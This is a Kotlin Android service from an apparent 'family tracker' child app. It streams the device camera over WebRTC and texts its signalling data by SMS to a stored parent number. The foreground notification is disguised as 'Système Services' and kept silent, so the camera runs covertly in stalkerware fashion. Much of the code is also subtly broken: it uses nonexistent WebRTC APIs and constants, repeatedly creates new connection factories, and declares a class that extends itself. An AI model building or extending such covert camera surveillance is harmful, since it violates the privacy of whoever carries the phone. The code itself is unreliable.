package com.family.tracker.child

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.hardware.camera2.CameraCharacteristics
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import org.webrtc.*
import org.webrtc.PeerConnection.IceServer
import org.webrtc.PeerConnection.RTCConfiguration
import org.webrtc.PeerConnection.SdpSemantics

class WebRTCService : Service() {
    companion object {
        private const val TAG = "WEBRTC"
        private const val CHANNEL_ID = "WebRTCService"
        
        var peerConnection: PeerConnection? = null
        var videoCapturer: VideoCapturer? = null
        var videoSource: VideoSource? = null
        var eglBase: EglBase? = null
        var surfaceTextureHelper: SurfaceTextureHelper? = null
        
        var isStreaming = false
        var currentCamera = CameraCharacteristics.LENS_FACING_BACK
        
        const val ACTION_START = "com.family.tracker.START_WEBRTC"
        const val ACTION_STOP = "com.family.tracker.STOP_WEBRTC"
        const val ACTION_SWITCH = "com.family.tracker.SWITCH_CAM_WEBRTC"
        
        private val ICE_SERVERS = listOf(
            IceServer.builder("stun:stun.l.google.com:19302").createIceServer(),
            IceServer.builder("stun:stun1.l.google.com:19302").createIceServer()
        )
    }

    private val signaling = SignalingHandler()

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        initWebRTC()
        Log.d(TAG, "✅ Service WebRTC prêt")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Caméra Privée", NotificationManager.IMPORTANCE_LOW)
            channel.description = "Flux vidéo direct"
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Système Services")
            .setContentText(if (isStreaming) "🎥 Flux actif" else "En attente")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    private fun initWebRTC() {
        eglBase = EglBase.create()
        val initializationOptions = PeerConnectionFactory.InitializationOptions.builder(this)
            .setFieldTrials("")
            .setEnableInternalTracer(false)
            .createInitializationOptions()
        PeerConnectionFactory.initialize(initializationOptions)
        
        val factory = PeerConnectionFactory.builder()
            .setOptions(PeerConnectionFactory.Options())
            .setVideoDecoderFactory(DefaultVideoDecoderFactory(eglBase!!.eglBaseContext))
            .setVideoEncoderFactory(DefaultVideoEncoderFactory(eglBase!!.eglBaseContext, true, true))
            .createPeerConnectionFactory()
        
        surfaceTextureHelper = SurfaceTextureHelper.create("CaptureThread", eglBase!!.eglBaseContext)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startStreaming()
            ACTION_STOP -> stopStreaming()
            ACTION_SWITCH -> switchCamera()
        }
        return START_STICKY
    }

    private fun startStreaming() {
        if (isStreaming) return
        Log.d(TAG, "🎥 Démarrage caméra...")
        
        val camEnumerator = Camera2Enumerator(this)
        val camName = camEnumerator.deviceNames.firstOrNull { name ->
            camEnumerator.getCameraCharacteristics(name)
                .get(CameraCharacteristics.LENS_FACING) == currentCamera
        } ?: camEnumerator.deviceNames[0]
        
        videoCapturer = Camera2Capturer(this, camName, null)
        videoSource = PeerConnectionFactory.builder()
            .createPeerConnectionFactory()
            .createVideoSource(videoCapturer!!.isScreencast)
        
        val videoFormat = VideoCapturer.CapturerConstraints(640, 480, 30, 640, 480, 30)
        videoCapturer!!.initialize(surfaceTextureHelper!!, this, videoSource!!.surfaceTextureHelper, null, videoFormat)
        videoCapturer!!.startCapture(640, 480, 30)
        
        val config = RTCConfiguration(ICE_SERVERS)
        config.sdpSemantics = SdpSemantics.UNIFIED_PLANAR
        
        peerConnection = PeerConnectionFactory.builder()
            .createPeerConnectionFactory()
            .createPeerConnection(config, signaling)
        
        val videoTrack = PeerConnectionFactory.builder()
            .createPeerConnectionFactory()
            .createVideoTrack("video0", videoSource!!)
        
        videoTrack.setEnabled(true)
        peerConnection!!.addTrack(videoTrack)
        
        isStreaming = true
        signaling.setService(this)
        Log.d(TAG, "✅ Caméra en attente de connexion...")
    }

    private fun stopStreaming() {
        Log.d(TAG, "🛑 Arrêt du flux...")
        videoCapturer?.stopCapture()
        videoCapturer?.dispose()
        videoSource?.dispose()
        peerConnection?.close()
        peerConnection = null
        isStreaming = false
    }

    private fun switchCamera() {
        currentCamera = if (currentCamera == CameraCharacteristics.LENS_FACING_BACK)
            CameraCharacteristics.LENS_FACING_FRONT
        else
            CameraCharacteristics.LENS_FACING_BACK
        if (isStreaming) {
            stopStreaming()
            startStreaming()
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
    override fun onDestroy() {
        stopStreaming()
        eglBase?.release()
        super.onDestroy()
    }

    class SignalingHandler : PeerConnection.Observer {
        private var service: WebRTCService? = null
        fun setService(s: WebRTCService) { service = s }
        
        override fun onIceCandidate(candidate: IceCandidate) {
            Log.d(TAG, "📤 ICE Candidate: ${candidate.sdp}")
            sendSignal("ICE:${candidate.sdp}:${candidate.sdpMLineIndex}:${candidate.sdpMid}")
        }
        
        override fun onIceConnectionChange(state: PeerConnection.IceConnectionState) {
            Log.d(TAG, "🔗 Connexion: $state")
        }
        
        override fun onSignalingChange(state: PeerConnection.SignalingState) {}
        override fun onIceConnectionReceivingChange(b: Boolean) {}
        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState) {}
        override fun onAddStream(stream: MediaStream) {}
        override fun onRemoveStream(stream: MediaStream) {}
        override fun onDataChannel(channel: DataChannel) {}
        override fun onRenegotiationNeeded() {}
        override fun onConnectionChange(newState: PeerConnection.PeerConnectionState) {}
        
        private fun sendSignal(data: String) {
            val prefs = service?.getSharedPreferences("tracker", Context.MODE_PRIVATE)
            val parentNum = prefs?.getString("parent", "") ?: return
            Log.d(TAG, "📤 Envoi signal à $parentNum")
            android.telephony.SmsManager.getDefault().sendTextMessage(parentNum, null, data, null, null)
        }
        
        fun receiveSignal(data: String) {
            Log.d(TAG, "📥 Signal reçu: $data")
            val pc = service?.peerConnection ?: return
            when {
                data.startsWith("OFFER:") -> {
                    val sdp = data.substring(6)
                    pc.setRemoteDescription(SdpObserver(), SessionDescription(SessionDescription.Type.OFFER, sdp))
                    pc.createAnswer(SdpObserver(), MediaConstraints())
                }
                data.startsWith("ANSWER:") -> {
                    val sdp = data.substring(7)
                    pc.setRemoteDescription(SdpObserver(), SessionDescription(SessionDescription.Type.ANSWER, sdp))
                }
                data.startsWith("ICE:") -> {
                    val parts = data.split(":")
                    if (parts.size >= 4) {
                        pc.addIceCandidate(IceCandidate(parts[1], parts[2].toInt(), parts[3]))
                    }
                }
            }
        }
    }
    
    class SdpObserver : SdpObserver {
        override fun onCreateSuccess(desc: SessionDescription?) {
            Log.d(TAG, "📤 SDP Créée: ${desc?.type}")
        }
        override fun onSetSuccess() {
            Log.d(TAG, "✅ SDP Définie")
        }
        override fun onCreateFailure(error: String?) { Log.e(TAG, "❌ Création SDP: $error") }
        override fun onSetFailure(error: String?) { Log.e(TAG, "❌ Définition SDP: $error") }
    }
}
